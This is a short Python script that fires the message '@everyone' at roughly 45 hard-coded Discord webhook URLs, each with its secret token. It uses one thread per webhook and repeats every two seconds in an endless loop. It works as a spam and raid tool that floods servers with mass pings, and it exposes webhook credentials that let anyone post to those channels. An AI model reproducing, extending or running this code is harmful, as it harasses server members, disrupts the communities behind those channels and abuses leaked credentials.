import time
import requests
import threading

message = "@everyone"

webhook_urls = [
    "https://discord.com/api/webhooks/1340455482636369972/Y4JF1a2g04ig9Pz2DojZddT6BCxj1_lZ3umgXcA3MuEnZQr9QwbyWmey0pJuQeH844Vb",
    "https://discord.com/api/webhooks/1340455503754694737/MOXaUqPOI3n5L4_kYfn900WuhW9tfD5SUnAA6gGH8Ilb35eyLALWX0nrsX_uV9if0u4b",
    "https://discord.com/api/webhooks/1340455504543219762/aIg-epCPHo54uXfr5y-KysGDTPGfmjsklsFu0Ql-sdq-vljCZC9uXkgwiQ2sYXEPk3is",
    "https://discord.com/api/webhooks/1340455505356918785/HTLfIM_XT2DvvpKCgIz-GFOnc5IOwpKttMf2rmdp7cN-5Gp6sWvDlSv4z5GCXUtClPl5",
    "https://discord.com/api/webhooks/1340455506266947764/WgzTO1c1oYXyNdYl0NPb0KnT7cwh1sTvAaMML4D2ly__HsEaQE815lWt9egnxQEqO2ti",
    "https://discord.com/api/webhooks/1340455506761879673/CMLhRDjAZANJHCU9J9-x1mueTqjKlO4O-xI-vkyQDt9x1GamEEjHIMRc7vg-Ioan5vca",
    "https://discord.com/api/webhooks/1340455507533631550/V45m1WksRfl9nMYvPTwYiwCV9zQG-sMKdbJ3ZSWDuebSkTFxpDMIGbP3EK0q86X3bY-t",
    "https://discord.com/api/webhooks/1340455508448116779/VLOP5iB6h39ysoXdecg30e74r9nLstG4_szCrjURFXoi87ToOA8OdtkJ8BkGy92xNBhI",
    "https://discord.com/api/webhooks/1340455509127467072/2hTvrOU3EyP_Ba8wt64l2bmvfBtbUh1HskKsQ2n5XJahe5OeQSo5P8rpPLtzgebiUGbB",

    "https://discord.com/api/webhooks/1340455509999751198/KvhHrPs6SuRe_Ki8mfkO8TyEt1stc2qyxASb39IiU80s3sBTDpQoNAtN9ePW7hnITfuF",
    "https://discord.com/api/webhooks/1340455510863904869/vYimVoeSDU9O99QTah8of9eLU821fawn5L1ZWqrhIoX7i0zzrMaeCuZcsPwaBWkxpCr-",

    "https://discord.com/api/webhooks/1340456878198493204/wW0QZ6rr6L-QiNxn_Tt6QXJVjK5wVUBvmS-2umwXDYS-4KwygmIWSqlA_ITtX9SLIQ8v",

    "https://discord.com/api/webhooks/1340456883982434426/TWqzKwxFMD8qVkzry2DAjWtPM2A604mf2tzXmtPHkmSW52UCIcP8_xvY_j3-66cqPBPB",
    "https://discord.com/api/webhooks/1340456887522693261/ogyibZPLApr-AHejUxY_78UoBqn3boG63_hqeWxrLFu3zH_i1vDjHMpnTViMSF-j1eH1",

    "https://discord.com/api/webhooks/1340456889753927701/my2cE1jw397bGzIASywCeH9N5kXt461GVszE2uO0Hr9fwA0Df5xi4f6WVFe4htk1-Y2B",

"https://discord.com/api/webhooks/1340456895512576162/kF6iiA2yfr3RDzwH1F2wqsnN7zR6encpfdsVHE91FkrWcmqh-qQdldLh757H06ozshm6",

    "https://discord.com/api/webhooks/1340456900138893554/cuC5aHgzZCe-iTZotR3wX4ODsNQKzN0bafveaLE6o79MQM3f0uD0baUXq4H60iTOzXuU",
    "https://discord.com/api/webhooks/1340456959639289947/sqszySycwvQJDPkZmNvTP6Rpzyekz2gFoX1zvGEnL24PlTXOtj29hWpGkFrNarBQS9Nj",
    "https://discord.com/api/webhooks/1340456960994181251/hWjPcWhpTbO0-f92awnP2Z84IuUZlpKHVynqYZHET5-9G8ua8-BnrtkwywNp3l-9eVWX",
    "https://discord.com/api/webhooks/1340456961451495444/8UtiDzmjpRxp2g7KLs6K9xkc-jJkI62CY3IRU3_PoraGdDNc1HE5ZcYOOs14U8g53W9i",

"https://discord.com/api/webhooks/1340456961959006289/v9AiJPq3SfZ_r8-0umaJ0H9eUK16G74NOrhnNJrHw74scncsgEmqFS5iAZ9ttqxgrNIl",

    "https://discord.com/api/webhooks/1340456962676097185/43g2gijgrS8N0-Zsno_Z80KNRrB0jxARh9OCyM7ziJWLenDrTPtkGEzgJLWlSgnKJDfy",
    "https://discord.com/api/webhooks/1340456963649175594/RouKznDTRIHvzQSjIOhfRsxRu2injNd8g6uL0EDsOvynsnvCHDL4l6_Qfj6vCNErTk-l",

    "https://discord.com/api/webhooks/1340456965033295912/jrbI0a_-N0GpcVKU1vEpdhcInxWxS8rh2i0p16e8CAxKUllbkiVkdaRg97BcUAuF7XRo",

    "https://discord.com/api/webhooks/1340456965653926030/-Pdqqi507Ewq25LAv1DvAG3o4d8libcvptRCeHMXEYoFgSYO-znQby5LBlOpcy6V_w0G",

    "https://discord.com/api/webhooks/1340457855740018800/AODvYi9KWVgw5-4US8lEFmrdv1g41YMLz7OL4HCUTmLduxtvP2SR6LMOZqgGOUWee62e",

    "https://discord.com/api/webhooks/1340457856654250044/Tkl7IDpzmg4s2-uN4a1RHttHLz-hNCIV52H6wgTduaQDtxkf6qAwZ3ApRvc6gyF4VvHK",

    "https://discord.com/api/webhooks/1340457857283522661/Wf_OuvqAMglsYG0Paurq0GcwigpvduN58yWIbT8z5CVcIuVoyYyIr-bHZHq-FCi5R4iP",

    "https://discord.com/api/webhooks/1340457857832714280/2DamneQCfR5s1Ar0PcSbGf5t4-HcvPRzfgTHEj3lKrauSFA89O0sD28szaJTG8pjQKVj",

    "https://discord.com/api/webhooks/1340457857283522661/Wf_OuvqAMglsYG0Paurq0GcwigpvduN58yWIbT8z5CVcIuVoyYyIr-bHZHq-FCi5R4iP",

    "https://discord.com/api/webhooks/1340460680280539157/uAHHfZxPHxFTFQ7f_hbLARb36DmgTAvGi115Qb5OwwOlHxL3bbBQLr9vFSv4JvAnGI6C",
    "https://discord.com/api/webhooks/1340460686840692797/VI623yHbDL9UYlNQOYA6E9iuH_gXAw3GMaHo9aCSzoBkdXqKSNKwu9G9kD3mOb4K5Ac7",
    "https://discord.com/api/webhooks/1340460697972244592/zpsnHSgdNlmN5M06AOFXuUHvfUSs6uv6GuTYX25uWE7nPpbqO0j0O-GtvQ1daiAdTFIq",
    "https://discord.com/api/webhooks/1340460698458787882/1AGlEHCQUVDTgylcs_iYjjBCk3XYGCjaBlSPeV1GZa4TBVk9gABoc2FGL0CqkmOfwG2s",
    "https://discord.com/api/webhooks/1340460698802716774/81t2DgxHJRM6Fgteh0c7MUZ1pUu-Op0KlEKF9hexX73kJj9EJjyEHhvuLx3ukbcy6yjk",
    "https://discord.com/api/webhooks/1340460699411021976/B6puXxdQzZVWFCmnosVBVHJz4V8RdOJ-c8hc-gGu-Bhzo1vKg8R9tSfH0Zof0czBw2Ub",
    "https://discord.com/api/webhooks/1340460699540787272/W4C-cv5FNaz853w8FQp9IzUgZCMIn0GeLMCF98OCs5xNF28qDoic7OX5Ybfrgr_C3oRW",
    "https://discord.com/api/webhooks/1340460700744679549/v9wM44RWUGe8H4rNjNUxfL-QetB63S3LXydB-7Sw7hP8j_K1ApAsrFGdb9ZMYwtxZak3",
    "https://discord.com/api/webhooks/1340460701336080384/AxgX_VaV27CH23b821xV5Tm_zwQB-ZRdH3MPJQGfIvdnp72ZOH94PATcix--_I_1Mggg",
    "https://discord.com/api/webhooks/1340460701449453650/iAdbc9Jl5VS5DAKvtPTHdcWya43lKrMs17UxI54WL_17SnQlr_ZeQu3ZQWjXep5raQLj",
    "https://discord.com/api/webhooks/1340460702485188698/jRRS_b__CQj6L7AcHx7wIqQY3UDMKEADDL-wxokVccX167SfW8cZ_j-88xDA7ewXBg1p",
    "https://discord.com/api/webhooks/1340460702682583070/mZiEcEUGgiX2RYML7tlxAfFbnpsYTqINTC7ZiASp7I23ZjwuOuzyMO9igrb4F7mZLD0R",
    "https://discord.com/api/webhooks/1340460702950887586/bbPAuxnHYABRRwR-2j7cVS5MMMeKM02_PlMZM68RNve4ccXPOZ5zULH7hv4EodWLthTb",
    "https://discord.com/api/webhooks/1340460703429034057/be-u-FpN7n86GtH7HWnLFRjYYhNlcKVNlvb_d8puPGcKBZswdK9Tj2IAoMSttUYa3px5",
]

def send_message(webhook, message):
    payload = {"content": message}
    try:
        response = requests.post(webhook, json=payload)
        if response.status_code == 429:
            print(f"Rate limited on {webhook}, retrying...")
            return False
        elif response.status_code != 204:
            print(f"Failed to send message to {webhook}. Status code: {response.status_code}")
            return False
        else:
            print(f"Message sent to {webhook}")
            return True
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

def send_messages():
    threads = []
    for webhook in webhook_urls:
        thread = threading.Thread(target=send_message, args=(webhook, message))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def main():
    while True:
        send_messages()
        time.sleep(2)

if __name__ == "__main__":
    main()
  
